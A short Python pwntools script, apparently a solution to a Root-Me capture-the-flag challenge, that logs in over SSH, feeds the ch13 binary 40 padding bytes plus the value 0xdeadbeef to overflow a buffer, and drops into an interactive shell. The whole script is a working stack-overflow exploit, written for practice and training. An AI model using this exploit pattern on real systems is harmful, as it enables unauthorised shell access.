from pwn import *

context.log_level = 'debug'

s = ssh(user='app-systeme-ch13',
        host='challenge02.root-me.org',
        port=2222,
        password='app-systeme-ch13')

p = s.process('./ch13')          # le binaire s'exécute sur le serveur
p.sendline(b'a' * 40 + p32(0xdeadbeef))
p.interactive()                  # shell interactif, stdin reste ouvert